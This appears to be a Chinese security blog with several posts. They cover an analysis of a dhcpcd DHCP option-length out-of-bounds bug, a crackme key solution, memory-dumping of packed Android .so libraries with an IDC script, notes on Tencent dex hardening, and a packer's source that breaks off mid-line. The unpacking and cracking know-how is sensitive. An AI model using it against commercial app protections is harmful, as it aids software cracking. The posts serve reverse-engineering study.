<p>   This option specifies a table of MTU sizes to use when performing<br>   Path MTU Discovery as defined in RFC 1191.  The table is formatted as<br>   a list of 16-bit unsigned integers, ordered from smallest to largest.<br>   The minimum MTU value cannot be smaller than 68.</p>
<p>   The code for this option is 25.  Its minimum length is 2, and the<br>   length MUST be a multiple of 2.</p>
<pre><code>Code   Len     Size 1      Size 2
</code></pre><p>   +—–+—–+—–+—–+—–+—–+—<br>   |  25 |  n  |  s1 |  s2 |  s1 |  s2 | …<br>   +—–+—–+—–+—–+—–+—–+—<br>    从上述的描述可以得知最小长度n规定为2，且长度为2的整数倍。但是可以构建一个option为25长度为3的数据包，既可以在长度校验函数中返回1从而通过校验，又能进入print_option函数中的while循环，当进入while循环后如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">t = data;</div><div class="line">	e = data + dl;</div><div class="line">	while (data &lt; e) &#123;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line">	else if (type &amp; UINT16) &#123;</div><div class="line">			memcpy(&amp;u16, data, sizeof(u16));</div><div class="line">			u16 = ntohs(u16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u16);</div><div class="line">			data += sizeof(u16);</div><div class="line">		&#125; </div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>dl为3，而data每次循环后只加了2，导致了此while循环多循环了一次，memcpy多copy了一次2字节，造成了越界。至此整个漏洞就分析完毕。</p>
<pre><code>By Ericky

2016.06.06
</code></pre><p>参考链接：</p>
<p>[1] <a href="https://tools.ietf.org/html/rfc2131" target="_blank" rel="external">https://tools.ietf.org/html/rfc2131</a></p>
<p>[2] <a href="https://tools.ietf.org/html/rfc2132" target="_blank" rel="external">https://tools.ietf.org/html/rfc2132</a></p>
<p>[3] <a href="https://android.googlesource.com/platform/external/dhcpcd/+/1390ace71179f04a09c300ee8d0300aa69d9db09" target="_blank" rel="external">https://android.googlesource.com/platform/external/dhcpcd/+/1390ace71179f04a09c300ee8d0300aa69d9db09</a></p>
<p>[4] <a href="http://source.android.com/security/bulletin/2016-04-02.html" target="_blank" rel="external">http://source.android.com/security/bulletin/2016-04-02.html</a></p>
<p>[5] <a href="http://www.isc.org/downloads/" target="_blank" rel="external">http://www.isc.org/downloads/</a></p>
<p>[6] <a href="https://help.ubuntu.com/community/isc-dhcp-server" target="_blank" rel="external">https://help.ubuntu.com/community/isc-dhcp-server</a></p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/01/03/一枚KeyGenMe分析/">
  <time datetime="2016-01-03T11:43:00.000Z">
    2016-01-03
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/01/03/一枚KeyGenMe分析/">一枚KeyGenMe分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="一枚KeyGenMe分析"><a href="#一枚KeyGenMe分析" class="headerlink" title="一枚KeyGenMe分析"></a>一枚KeyGenMe分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玩CM的人好像很少，大家都缺乏热情，小弟在此分析一枚，错误之处望各位大侠不吝指正。</p>
<p>“元旦佳节，难得有闲情逸致。品一杯香茗，看IDA中的汇编代码。”<br>虽说是迟到的祝福，但这里还是先祝各位朋友元旦快乐，愿大家的技术蒸蒸日上，身体棒，棒，棒！在逆向这条荆棘密布的道路上，难免遇到各种各样的困难，有的甚至是看似不可逾越的鸿沟。但话又说回来，其实逆向这个领域，很多技术是相通的，思维方式更是相通的。<br>网上的资料并不少，教程和文章都很多，少的就是大家对一些新问题的思考，对一些知识的灵活运用和融会贯通。</p>
<h2 id="初探加壳so"><a href="#初探加壳so" class="headerlink" title="初探加壳so"></a>初探加壳so</h2><p>一般来说，我们从java层入手，在跟踪某一个关键函数或者一个关键变量的时候，会跟到一个native的函数里，这个时候就需要进入深邃的so。或许很多人会害怕so加壳，觉得那么遥不可及。我们来揭开加壳后so的神秘面纱，让大家对so加壳不再畏惧。<br>打开IDA定位到关键函数后：<br><img src="http://img.blog.csdn.net/20160103193830728" alt="这里写图片描述"></p>
<p>如图，指令都被抹掉了，关键的函数完完全全被“清空”。<br>其他函数也一并被清空：<br><img src="http://img.blog.csdn.net/20160103193844500" alt="这里写图片描述"></p>
<p>##卸下加壳so的外衣<br>尽管IDA加载的so里面的指令都被清空了，但是有一条不变的宗旨。那就是这些代码在执行之前肯定要解密的，解密的时候那就肯定在内存中，既然在内存中，我们就可以把它拿出来。<br>在关键函数段首下好断点：<br><img src="http://img.blog.csdn.net/20160103193854465" alt="这里写图片描述"></p>
<p>IDA附加程序，出现same则点击same对话框。接下来需要让程序断在我们的断点处，代码已经解密出来了：<br><img src="http://img.blog.csdn.net/20160103193902192" alt="这里写图片描述"><br>接下来用Ctrl+S 来定位一下该so在内存中的位置，用以下IDC脚本dump出来即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">auto fp, SoAddress;</div><div class="line">fp = fopen(&quot;D:\\unpack.so&quot;, &quot;wb&quot;);</div><div class="line">for ( SoAddress=0x51F6546C; SoAddress&lt; 0x51F6B7B8; SoAddress++ )</div><div class="line">fputc(Byte(SoAddress), fp);</div></pre></td></tr></table></figure>
<h2 id="脱壳前后对比"><a href="#脱壳前后对比" class="headerlink" title="脱壳前后对比"></a>脱壳前后对比</h2><p><img src="http://img.blog.csdn.net/20160103193935027" alt="这里写图片描述"></p>
<p>左边为加壳后的指令，都被抹去<br>右边为脱壳后的指令，全部恢复</p>
<p>细心的读者，肯定会发现，这和脱dex很相似，是的，这就是脱dex的方法在脱so壳上的再利用。</p>
<h2 id="So里面遨游"><a href="#So里面遨游" class="headerlink" title="So里面遨游"></a>So里面遨游</h2><p>在check函数里面：<br><img src="http://img.blog.csdn.net/20160103193958340" alt="这里写图片描述"></p>
<p>可以看到最后对比的字符串为：XVccAwVbVQQE<br>我们从最后开始往前推到。<br>转换成相对应的Hex如下:<br>0x58 0x56 0x63 0x63</p>
<p>0x41 0x77 0x56 0x62</p>
<p>0x56 0x51 0x51 0x45</p>
<p>这些Hex的值怎么算出来的呢？继续往前看：<br>在base64encode函数中：<br><img src="http://img.blog.csdn.net/20160103194010501" alt="这里写图片描述"></p>
<p>一共12个值，通过num2base64char函数，循环3次，每次4个值。<br>进入num2base64char函数里看算法：<br><img src="http://img.blog.csdn.net/20160103194045356" alt="这里写图片描述"></p>
<p>贴一段转换后的java代码：<br>     public static int NumToChar(int a1){<br>         {<br>             int v2 ;<br>              if ( a1 &lt;= 0x19 ) //65到90<br>                return (a1 + 65);<br>              if ( a1 &lt;= 0x33 )//<br>                return (a1 + 71);//71到122<br>              if ( a1 &lt;= 0x3D )//61-4<br>                return (a1 - 4);<br>              v2 = 43;<br>              if ( a1 != 62 )<br>              {<br>                if ( a1 == 63 )<br>                {<br>                  v2 = 47;<br>                }<br>                else if ( a1 == 64 )<br>                {<br>                  v2 = 61;<br>                }<br>              }<br>              return v2;<br>            }<br>根据这段算法逆推出Numtochar之前的Hex为:<br>0x17 0x15 0x1c 0x1c</p>
<p>0x00 0x30 0x15 0x1b</p>
<p>0x15 0x10 0x10 0x04</p>
<p>继续向前看，找出这12个Hex的值是如何来的：<br><img src="http://img.blog.csdn.net/20160103194057046" alt="这里写图片描述"><br>图中红框的函数为关键函数，进去看一下：<br><img src="http://img.blog.csdn.net/20160103194306875" alt="这里写图片描述"></p>
<p>传入3个参数，生成了4个结果。所以之前的12个Hex的值应该是3组3位的Hex值生成的，根据算法，解密程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int x ,y ,z ,four1,four2,four3,four4;</div><div class="line">for(x=0;x&lt;=0xff;x++)&#123;</div><div class="line">	for(y=0;y&lt;=0xff;y++)&#123;</div><div class="line">		for(z=0;z&lt;=0xff;z++)&#123;</div><div class="line">			four1 = x&gt;&gt;2;</div><div class="line">			four2 = (16 * x &amp; 0x30) + (y &gt;&gt; 4);</div><div class="line">			four3 = (4 * y &amp; 0x3C) + (z &gt;&gt; 6);</div><div class="line">			four4 = z &amp; 0x3F;</div><div class="line">			if(four1==0x15 &amp;&amp; four2==0x10 &amp;&amp;  four3==0x10 &amp;&amp; four4==0x04)&#123;</div><div class="line">				System.out.println(&quot;X:0x&quot;+Integer.toHexString(x)+&quot; Y:0x&quot;+Integer.toHexString(y)+&quot; Z:0x&quot;+Integer.toHexString(z));</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得出3组3位的Hex值如下：<br>0x5d 0x57 0x1c<br>0x03 0x05 0x5b<br>0x55 0x04 0x04<br>再往前就是java层了：只要传入的字符串为以下Hex则成功：<br>16进制：5d 57 1c 03 05 5b 55 04 04</p>
<pre><code> | |
| |
</code></pre><hr>
<p>   \  /<br>      \/</p>
<p>  JAVA层<br>JAVA层的加密函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">public static String Encrpt(String arg9, String arg10) &#123;</div><div class="line">        String v0_2;</div><div class="line">        String v1 = null;</div><div class="line">        if(arg9 != null &amp;&amp; arg10 != null) &#123;</div><div class="line">            try &#123;</div><div class="line">                char[] v2 = arg10.toCharArray();</div><div class="line">                char[] v3 = arg9.toCharArray();</div><div class="line">                int v4 = v3.length; //v4 =9</div><div class="line">                int v5 = v2.length;</div><div class="line">                char[] v6 = new char[v4];</div><div class="line">                int v0_1;</div><div class="line">                for(v0_1 = 0; v0_1 &lt; v4; ++v0_1) &#123;</div><div class="line">                	System.out.println((int)(v3[v0_1])+&quot; ^ &quot;+(int)v2[v0_1 % v5]);</div><div class="line">                    v6[v0_1] = ((char)(v3[v0_1] ^ v2[v0_1 % v5]));</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                v0_2 = new String(v6);</div><div class="line">            &#125;</div><div class="line">            catch(Exception v0) &#123;</div><div class="line">                v0.printStackTrace();</div><div class="line">                v0_2 = v1;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v0_2 = v1;</div><div class="line">        &#125;</div><div class="line">        return v0_2;</div><div class="line">    &#125;</div><div class="line">	public static String toHexString(String s) &#123;</div><div class="line">		String str = &quot;&quot;;</div><div class="line">		for (int i = 0; i &lt; s.length(); i++) &#123;</div><div class="line">			int ch = (int) s.charAt(i);</div><div class="line">			String s4 = Integer.toHexString(ch);</div><div class="line">			System.out.println((i+1)+&quot;: 0x&quot;+s4);</div><div class="line">			str = str + s4;</div><div class="line">		&#125;</div><div class="line">		return str;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>运算都是异或加密，逆运算就是结果与key再异或回来，而key在Java层已经可以知道，为”52pojie”,所以异或回来的答案如下：<br>Answer:104 101 108 108 111 50 48 49 54</p>
<p>最后再查一下ASCII码表得出答案为：hello2016<br>验证一下：</p>
<p><img src="http://img.blog.csdn.net/20160103194155690" alt="这里写图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望通过对这篇文章阅读，你已经对so不再恐惧了。再次祝大家2016年有新的收获！</p>
<p>2016年元旦</p>
<p> By Ericky </p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/01/02/学会”融会贯通”简易脱某So壳/">
  <time datetime="2016-01-02T11:19:00.000Z">
    2016-01-02
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/01/02/学会”融会贯通”简易脱某So壳/">学会“融会贯通”简易脱某So壳</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="学会”融会贯通”简易脱某So壳"><a href="#学会”融会贯通”简易脱某So壳" class="headerlink" title="学会”融会贯通”简易脱某So壳"></a>学会”融会贯通”简易脱某So壳</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“元旦佳节，难得有闲情逸致。品一杯香茗，看IDA中的汇编代码。”<br>虽说是迟到的祝福，但这里还是先祝各位朋友元旦快乐，愿大家的技术蒸蒸日上，身体棒，棒，棒！在逆向这条荆棘密布的道路上，难免遇到各种各样的困难，有的甚至是看似不可逾越的鸿沟。但话又说回来，其实逆向这个领域，很多技术是相通的，思维方式更是相通的。<br>网上的资料并不少，教程和文章都很多，少的就是大家对一些新问题的思考，对一些知识的灵活运用和融会贯通。今天就用这样的方式来脱一下某公司的so壳。论证一下融会贯通在逆向领域甚至说在“这个稀少方向”的重要性。</p>
<h2 id="初探加壳so"><a href="#初探加壳so" class="headerlink" title="初探加壳so"></a>初探加壳so</h2><p>一般来说，我们从java层入手，在跟踪某一个关键函数或者一个关键变量的时候，会跟到一个native的函数里，这个时候就需要进入深邃的so。或许很多人会害怕so加壳，觉得那么遥不可及。我们来揭开加壳后so的神秘面纱，让大家对so加壳不再畏惧。<br>打开IDA定位到关键函数后：<br><img src="http://img.blog.csdn.net/20160103191748537" alt="这里写图片描述"><br>如图，指令都被抹掉了，关键的函数完完全全被“清空”。<br>其他函数也一并被清空：<br><img src="http://img.blog.csdn.net/20160103191758078" alt="这里写图片描述"></p>
<h2 id="卸下加壳so的外衣"><a href="#卸下加壳so的外衣" class="headerlink" title="卸下加壳so的外衣"></a>卸下加壳so的外衣</h2><p>尽管IDA加载的so里面的指令都被清空了，但是有一条不变的宗旨。那就是这些代码在执行之前肯定要解密的，解密的时候那就肯定在内存中，既然在内存中，我们就可以把它拿出来。<br>在关键函数段首下好断点：<br><img src="http://img.blog.csdn.net/20160103191809592" alt="这里写图片描述"></p>
<p>IDA附加程序，出现same则点击same对话框。接下来需要让程序断在我们的断点处，代码已经解密出来了：<br><img src="http://img.blog.csdn.net/20160103191818904" alt="这里写图片描述"><br>接下来用Ctrl+S 来定位一下该so在内存中的位置，用以下IDC脚本dump出来即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">auto fp, SoAddress;</div><div class="line">fp = fopen(&quot;D:\\unpack.so&quot;, &quot;wb&quot;);</div><div class="line">for ( SoAddress=0x51F6546C; SoAddress&lt; 0x51F6B7B8; SoAddress++ )</div><div class="line">fputc(Byte(SoAddress), fp);</div></pre></td></tr></table></figure>
<h2 id="脱壳前后对比"><a href="#脱壳前后对比" class="headerlink" title="脱壳前后对比"></a>脱壳前后对比</h2><p>左边为加壳后的指令，都被抹去<br>右边为脱壳后的指令，全部恢复</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望通过对这篇文章阅读，你已经对so不再恐惧了。有所思考的读者，肯定会发现，这和脱dex很相似，是的，这就是脱dex的方法在脱so壳上的再利用。很多人遇到问题就百度，就google，百度和google没有的话他就不知所措了，或者说是一直在等他人分享的工具，在这样的心理下，形成了不容易使得他自身技术进步的一种思维方式。我还是想说，很多技术其实网上都有资料，稍微变形或者换了一个新东西很多人就懵了(最近还有人问支付宝内购的问题，论坛里有大量的资料了)，所以说，对知识学习的融会贯通的程度决定了我们能走多远，另外一方面，我们缺的不是资料，缺的是思考，缺的是一个思维定式里的突破。最后希望大家能把学的知识融会贯通，也再次祝大家2016年有新的收获！<br>(<em>^__^</em>)<br>PS：附件附上脱壳前后so。<br>2016.1.2<br>By Ericky</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2015/11/02/Dex加固总结之腾讯加固/">
  <time datetime="2015-11-02T08:01:00.000Z">
    2015-11-02
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2015/11/02/Dex加固总结之腾讯加固/">Dex加固总结之腾讯加固</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h2 id="Dex加固总结之腾讯加固"><a href="#Dex加固总结之腾讯加固" class="headerlink" title="Dex加固总结之腾讯加固"></a>Dex加固总结之腾讯加固</h2><p>【作者声明】：只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教！</p>
<p>由于dex脱壳的文章很多，讲原理的文章也到处都是，所以我就不抛砖头误导大家了。快到2016年了，时隔一年，来总结一下这些加固厂商的手法。</p>
<h3 id="1-加固前后文件对比，左边为原包"><a href="#1-加固前后文件对比，左边为原包" class="headerlink" title="1.加固前后文件对比，左边为原包"></a>1.加固前后文件对比，左边为原包</h3><p><img src="http://img.blog.csdn.net/20151102155103307" alt="这里写图片描述"></p>
<h3 id="2-脱壳后类名结构"><a href="#2-脱壳后类名结构" class="headerlink" title="2.脱壳后类名结构"></a>2.脱壳后类名结构</h3><p><img src="http://img.blog.csdn.net/20151102155125074" alt="这里写图片描述"><br>tencent.StubShell主要是用来执行腾讯的逻辑代码。</p>
<h3 id="3-使得反编译工具失败"><a href="#3-使得反编译工具失败" class="headerlink" title="3.使得反编译工具失败"></a>3.使得反编译工具失败</h3><p>插入一个A001类，导致反编译Smali失败<br><img src="http://img.blog.csdn.net/20151102155132941" alt="这里写图片描述"><br>                                    图一<br><img src="http://img.blog.csdn.net/20151102155143614" alt="这里写图片描述"><br>                                    图二<br>能看到这些的话，腾讯App加固脱壳就完成了。</p>
<p>Game Over<br>―――――――――――――――――――――――――――――――――<br>2015.11.02<br>By Ericky      </p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2015/08/10/早期学习写壳代码/">
  <time datetime="2015-08-10T05:49:00.000Z">
    2015-08-10
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2015/08/10/早期学习写壳代码/">早期学习写壳代码</a></h1>
  

  </header>
  
  <div class="entry">
    
      <p>早期自己弄的一些东西，大牛绕过。<br>入门写壳的同学可以参考看看。<br>效果如下：<br><img src="http://img.blog.csdn.net/20150810134504878" alt="这里写图片描述"><br>Java 层：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">package com.droider.crackme0201;</div><div class="line"></div><div class="line"></div><div class="line">import java.lang.String;</div><div class="line">import android.app.Application;</div><div class="line">import android.content.Context;</div><div class="line">import android.content.res.Configuration;</div><div class="line"></div><div class="line">public class TestApplication extends Application &#123;</div><div class="line">	static&#123;</div><div class="line">		System.loadLibrary(&quot;Nothing&quot;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	@Override</div><div class="line">	protected void attachBaseContext(Context base) &#123;</div><div class="line">		super.attachBaseContext(base);</div><div class="line">		ErickyGuard(base);</div><div class="line">		ErickyProtect(base);</div><div class="line">		</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	public native void ErickyGuard(Context context);</div><div class="line">	public native Object ErickyProtect(Context context);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>C层：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div></pre></td><td class="code"><pre><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;jni.h&gt;</div><div class="line">#include &lt;android/log.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;elf.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;assert.h&gt;</div><div class="line">#define DEBUG</div><div class="line">#define   LOG_TAG    &quot;LOG_TEST&quot;</div><div class="line">#define   LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)</div><div class="line">#define   LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)</div><div class="line">// 获取数组的大小</div><div class="line"># define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0])))</div><div class="line">// 指定要注册的类，对应完整的java类名</div><div class="line">#define JNIREG_CLASS &quot;com/droider/crackme0201/TestApplication&quot;</div><div class="line">//Function  Statements</div><div class="line"></div><div class="line">jstring   CharTojstring(JNIEnv*   env,   char*   str);</div><div class="line">jobject invokeStaticMethodss (JNIEnv *env,jstring class_name, jstring method_name, jobjectArray pareTyple, jobjectArray pareVaules);</div><div class="line">jobject   getFieldOjbect(JNIEnv *env,		jstring class_name, jobject obj, jstring fieldName);</div><div class="line">void     setFieldOjbect(JNIEnv *env, jstring class_name, jstring fieldName, jobject obj, jobject filedVaule);</div><div class="line">void 		guard( JNIEnv* env,jobject thiz,jobject context );</div><div class="line">JNIEXPORT jobject JNICALL sub_2222( JNIEnv* env,</div><div class="line">                                                  jobject thiz,jobject context )</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">	jclass native_clazz = env-&gt;GetObjectClass(context);</div><div class="line">	jmethodID methodID_func = env-&gt;GetMethodID(native_clazz,&quot;getPackageName&quot;, &quot;()Ljava/lang/String;&quot;);</div><div class="line">	jstring packagename =(jstring)(env-&gt;CallObjectMethod(context, methodID_func));</div><div class="line">	//**************************************</div><div class="line">	char *aa=&quot;android.app.ActivityThread&quot;, *bb = &quot;currentActivityThread&quot;;</div><div class="line">	jstring jaa= 